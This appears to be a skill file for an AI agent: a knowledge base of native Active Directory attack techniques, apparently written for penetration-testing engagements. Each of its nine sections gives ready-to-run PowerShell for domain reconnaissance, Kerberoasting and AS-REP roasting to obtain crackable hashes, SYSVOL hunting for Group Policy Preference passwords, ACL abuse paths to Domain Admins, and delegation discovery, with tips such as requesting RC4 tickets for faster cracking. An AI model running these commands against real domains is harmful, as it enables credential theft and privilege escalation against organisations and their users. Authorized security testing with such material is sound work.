---
name: directory-review
description: >-
  Active Directory Enumeration & Attacks (native) — Knowledge Base — AD work without an AD attack-path
  mapping tool, an AD data collector, an AD enumeration framework, or a Kerberos ticket-abuse tool.
  Everything via `System.DirectoryServices` (ADSI / `DirectorySearcher`), built-in `Get-AD*` only
  where RSAT is present-by-default, `nltest`, and .NET Kerberos classes. You build the graph view
  manually from JSON dumps. Triggers: Active Directory, AD enum, domain recon, LDAP, ADSI,
  DirectorySearcher, SPN, service-account ticket extraction, no-preauth ticket extraction,
  AD-attack-path-mapping-tool equivalent, AD-enumeration-framework equivalent, ACL abuse, trusts,
  RBCD, delegation, DCSync.
license: MIT
metadata:
  user-invocable: "false"
  origin: agents/directory-review/directory-review.md (verbatim; frontmatter prefixado)
  progressive-disclosure: index-first
---
# Active Directory Enumeration & Attacks (native) — Knowledge Base
_Last updated: 2026-06-22_

AD work without an AD attack-path mapping tool, an AD data collector, an AD enumeration framework, or a Kerberos ticket-abuse tool. Everything via `System.DirectoryServices` (ADSI / `DirectorySearcher`), built-in `Get-AD*` only where RSAT is present-by-default, `nltest`, and .NET Kerberos classes. You build the graph view manually from JSON dumps.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | Domain context & current-user groups | Any domain-joined host | 0-native | active-directory, recon, ldap, no-rsat |
| T2 | LDAP user/computer enumeration via DirectorySearcher | Need the domain object inventory; no RSAT | 0-native | active-directory, recon, ldap, no-rsat |
| T3 | SPN enumeration (service-account ticket extraction targeting) | Hunting service accounts to extract tickets for | 0-native | active-directory, ticket-extraction, ldap, recon |
| T4 | Manual service-account ticket extraction (request + extract ticket) | T3 found SPNs; want the crackable hash | 0-native | active-directory, ticket-extraction, cred-access, kerberos |
| T5 | No-preauth ticket extraction (no-preauth accounts) | Account with `DONT_REQ_PREAUTH` | 1-python | active-directory, no-preauth-ticket, cred-access, tier1-python |
| T6 | ACL / ownership abuse discovery | Mapping who can reset/own/write what | 0-native | active-directory, acl, privesc, ldap |
| T7 | Domain trust & foreign-membership map | Multi-domain / forest engagement | 0-native | active-directory, recon, trusts, ldap |
| T8 | GPP / SYSVOL credential hunt | Domain with legacy Group Policy Preferences | 0-native | active-directory, cred-access, sysvol |
| T9 | Unconstrained/constrained/RBCD delegation discovery | Hunting delegation privesc | 0-native | active-directory, delegation, privesc, ldap |

## Techniques

### T1: Domain context & current-user groups
Tags: active-directory, recon, ldap, no-rsat
When: First contact on any domain-joined host.
Why: Establishes the domain, DCs, your effective group memberships (incl. nested), and any privileged-group membership — the AD equivalent of `host-inventory T1`. No RSAT needed.
Tier: 0-native
Steps: 1. Domain + DC discovery 2. Effective groups (incl. nested) 3. Note Domain Admins / DnsAdmins / etc. membership
Payload:
```powershell
$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $d.Name; $d.DomainControllers
nltest /dclist:$($d.Name)
whoami /groups
([ADSISEARCHER]"(samaccountname=$env:USERNAME)").FindOne().Properties.memberof
```
Signal: membership in a privileged group, or tokenGroups including a high-value SID. | Pitfall: `memberof` doesn't show nested/primary-group membership — use `tokenGroups` or `whoami /groups` for the effective set.
Source: distilled native AD recon — 2026-06-22

### T2: LDAP user/computer enumeration via DirectorySearcher
Tags: active-directory, recon, ldap, no-rsat
When: You need the domain object inventory and RSAT/`Get-ADUser` isn't installed.
Why: `DirectorySearcher` talks LDAP directly with any domain user's token — no RSAT, no AD enumeration framework. Dump users, computers, descriptions (often hold passwords), and admincount=1 accounts.
Tier: 0-native
Steps: 1. Build a DirectorySearcher 2. Filter for the object set 3. Dump to JSON in `3-Recon/` for manual graphing
Payload:
```powershell
$s = [ADSISEARCHER]"(&(objectCategory=user)(objectClass=user))"
$s.PageSize = 1000
$s.PropertiesToLoad.AddRange(@('samaccountname','description','memberof','admincount','useraccountcontrol'))
$s.FindAll() | % { $_.Properties } |
  Select @{n='sam';e={$_.samaccountname}}, @{n='desc';e={$_.description}}, @{n='ac';e={$_.admincount}} |
  ConvertTo-Json | Out-File 3-Recon\ad-users.json
# Computers: change filter to (objectCategory=computer)
```
Signal: a `description` with a password; `admincount=1` accounts to target. | Pitfall: PageSize is required or you only get the first 1000; descriptions are a classic plaintext-cred leak — always pull them.
Source: distilled native LDAP enum — 2026-06-22

### T3: SPN enumeration (service-account ticket extraction targeting)
Tags: active-directory, ticket-extraction, ldap, recon
When: Hunting service accounts whose TGS you can request and crack offline.
Why: Any account with a `servicePrincipalName` set can have its service-account ticket extracted by any domain user. `DirectorySearcher` finds them — no Kerberos ticket-abuse tool/GetUserSPNs needed for the *enumeration* step.
Tier: 0-native
Steps: 1. LDAP filter for user objects with an SPN 2. Record sam + SPN 3. Feed to T4
Payload:
```powershell
$s=[ADSISEARCHER]"(&(objectCategory=user)(servicePrincipalName=*))"
$s.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname','memberof'))
$s.FindAll() | % { [pscustomobject]@{ sam=$_.Properties.samaccountname[0]; spn=($_.Properties.serviceprincipalname -join ';') } }
```
Signal: a service account that's also a member of a privileged group → high-value extraction. | Pitfall: `krbtgt` and machine accounts have SPNs too — filter to user objects (done in the filter above).
Source: distilled native service-account ticket extraction targeting — 2026-06-22

### T4: Manual service-account ticket extraction (request + extract ticket)
Tags: active-directory, ticket-extraction, cred-access, kerberos
When: T3 gave you SPNs and you want the crackable TGS hash.
Why: You can request a TGS for any SPN with the native .NET `KerberosRequestorSecurityToken` class — this is exactly what a Kerberos ticket-abuse tool/GetUserSPNs do under the hood. Then extract the ticket from the cache. No tool dropped.
Tier: 0-native
Steps: 1. Request the TGS via .NET 2. Confirm it's cached (`klist`) 3. Extract the ticket bytes → format the `$krb5tgs$` hash for offline cracking (Tier-1 helper)
Payload:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.corp.local:1433"
klist                                           # confirm the TGS is now cached
```
Signal: the TGS appears in `klist` with RC4 (etype 23) → crackable. | Pitfall: ticket *extraction to a crackable hash* is the part native PowerShell can't cleanly format — escalate to a small Tier-1 step (read the LSA cache / parse the ticket) OR hand the cached-ticket export to the user for offline cracking on their hardware. Note this in the finding. Request etype RC4 where possible (AES is far slower to crack).
Variations: where an in-memory credential-dumping tool's `kerberos::list /export` is off-limits, a stdlib Python parser of the credential cache produces the hash (Tier 1 — escalation: ASN.1/Kerberos ticket parsing is impractical in PowerShell).
Source: distilled native service-account ticket extraction — 2026-06-22

### T5: No-preauth ticket extraction (no-preauth accounts)
Tags: active-directory, no-preauth-ticket, cred-access, tier1-python
When: T2 surfaced an account with `DONT_REQ_PREAUTH` (UAC bit 0x400000).
Why: Such accounts return an AS-REP encrypted with the user's key to *any* requester — crackable offline, no creds needed. Crafting the raw AS-REQ and parsing the AS-REP is Kerberos protocol work PowerShell can't do natively.
Tier: 1-python
Escalation: building/parsing raw Kerberos AS-REQ/AS-REP packets requires ASN.1 + socket work that PowerShell has no native primitive for; a stdlib Python script (socket + manual ASN.1, no remote-protocol exploitation toolkit) does it.
Steps: 1. Find no-preauth accounts (LDAP filter `userAccountControl:1.2.840.113556.1.4.803:=4194304`) 2. Forge AS-REQ 3. Extract the no-preauth AS-REP hash
Payload:
```powershell
$s=[ADSISEARCHER]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$s.FindAll() | % { $_.Properties.samaccountname }
# then the Tier-1 AS-REP requester (5-Scripts/nopreauth-ticket.py)
```
Signal: an AS-REP hash for a real account. | Pitfall: confirm Python is on the box; absent → `@user` task. Don't fabricate the hash format — the contract requires the actual AS-REP bytes.
Source: distilled native-normalized no-preauth ticket extraction — 2026-06-22

### T6: ACL / ownership abuse discovery
Tags: active-directory, acl, privesc, ldap
When: Mapping who can `GenericAll`/`WriteDACL`/`ForceChangePassword`/own which objects — an AD attack-path mapping tool's "shortest path to DA" question, done manually.
Why: AD privesc usually runs through ACL edges (e.g., you have `GenericWrite` on a user → set their SPN → service-account ticket extraction; or `WriteDACL` on a group → add yourself). `Get-Acl` over the ADSI path reads the DACL natively.
Tier: 0-native
Steps: 1. Pick high-value targets (DA group, key users) 2. Read their nTSecurityDescriptor 3. Find ACEs granting your principal/groups dangerous rights
Payload:
```powershell
$o=[ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=corp,DC=local"
$o.psbase.ObjectSecurity.Access |
  ? { $_.IdentityReference -match $env:USERNAME -and $_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteOwner|WriteProperty' }
```
Signal: an ACE granting your account `GenericAll` on a privileged object. | Pitfall: rights can be inherited or apply to a specific property set (e.g., only `member`) — read `ObjectType`/`InheritedObjectType` GUIDs, don't assume full control from one ACE.
Source: distilled native ACL recon — 2026-06-22

### T7: Domain trust & foreign-membership map
Tags: active-directory, recon, trusts, ldap
When: Multi-domain or forest engagement — finding cross-domain attack paths.
Why: Trusts (and foreign-security-principals in privileged groups) are how you pivot between domains. `nltest` + ADSI enumerate them natively.
Tier: 0-native
Steps: 1. List trusts 2. Find foreign principals in local privileged groups 3. Note bidirectional/transitive trusts
Payload:
```powershell
nltest /domain_trusts /all_trusts
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).Domains
$s=[ADSISEARCHER]"(objectClass=trustedDomain)"; $s.FindAll() | % { $_.Properties }
```
Signal: a bidirectional trust to a domain you have a foothold in. | Pitfall: a trust's *direction* and *transitivity* determine exploitability — record both, not just existence.
Source: distilled native trust recon — 2026-06-22

### T8: GPP / SYSVOL credential hunt
Tags: active-directory, cred-access, sysvol
When: Legacy domain that used Group Policy Preferences to set local passwords.
Why: GPP-stored passwords in SYSVOL XML are AES-encrypted with a *Microsoft-published* key — trivially decryptable. Any domain user can read SYSVOL. Native file read + a known-key decrypt.
Tier: 0-native
Steps: 1. Grep SYSVOL for `cpassword` 2. Decrypt with the public AES key 3. Validate the recovered cred
Payload:
```powershell
Get-ChildItem "\\corp.local\SYSVOL\corp.local\Policies\" -Recurse -Include *.xml -ErrorAction SilentlyContinue |
  Select-String 'cpassword'
# decrypt cpassword with the published 32-byte AES key (System.Security.Cryptography.AesCryptoServiceProvider)
```
Signal: a `cpassword` value → decrypts to a local admin password reused across the domain. | Pitfall: MS14-025 removed GPP password-setting; only legacy/un-remediated domains have these. Decrypt natively with .NET AES + the public key (don't claim a value you haven't decrypted — the contract).
Source: distilled native GPP hunt — 2026-06-22

### T9: Unconstrained/constrained/RBCD delegation discovery
Tags: active-directory, delegation, privesc, ldap
When: Hunting delegation-based privesc paths.
Why: Unconstrained-delegation hosts cache TGTs (capture DA's); constrained/RBCD let you impersonate to specific services. Discovery is an LDAP filter; the abuse is a follow-on. Enumeration is fully native.
Tier: 0-native
Steps: 1. LDAP-filter accounts by delegation UAC flags / `msDS-AllowedToDelegateTo` / `msDS-AllowedToActOnBehalfOfOtherIdentity` 2. Classify each 3. Note the abuse path
Payload:
```powershell
# Unconstrained (TRUSTED_FOR_DELEGATION = 0x80000):
([ADSISEARCHER]"(userAccountControl:1.2.840.113556.1.4.803:=524288)").FindAll() | % {$_.Properties.samaccountname}
# Constrained:
([ADSISEARCHER]"(msDS-AllowedToDelegateTo=*)").FindAll() | % {$_.Properties.samaccountname}
```
Signal: a computer with unconstrained delegation you can coerce auth to. | Pitfall: the *abuse* (TGT capture / S4U2self+proxy) needs Kerberos manipulation — often Tier-1 or a `@user`/forge step; enumeration alone is not impact (impact-first bar).
Source: distilled native delegation recon — 2026-06-22
